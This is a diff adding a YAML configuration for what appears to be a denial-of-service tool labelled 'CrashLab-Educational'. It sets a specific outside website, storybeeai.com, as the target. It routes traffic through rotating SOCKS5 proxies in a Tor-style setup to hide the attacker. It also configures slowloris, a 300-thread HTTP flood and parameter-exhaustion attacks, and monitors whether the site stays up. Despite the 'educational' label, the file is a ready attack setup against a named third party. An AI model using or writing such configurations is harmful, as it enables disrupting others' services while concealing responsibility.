@@ -1,0 +1,28 @@
+target:
+  base_url: "https://storybeeai.com"   
+  follow_redirects: true
+
+proxies:
+  enabled: true          # toggle on/off
+  proxy_list_file: "proxies.txt"  # one per line: socks5://127.0.0.1:9050
+  rotation: "round_robin"
+
+crawl:
+  max_depth: 3
+  user_agent: "CrashLab-Educational/1.0"
+  delay: 0.5             # seconds between requests
+
+attacks:
+  slowloris:
+    sockets: 200
+    duration: 60          # seconds
+  http_flood:
+    threads: 300
+    duration: 60
+  param_exhaust:
+    threads: 100
+    params_per_request: 50
+
+monitor:
+  check_interval: 2       # seconds
+  timeout: 5
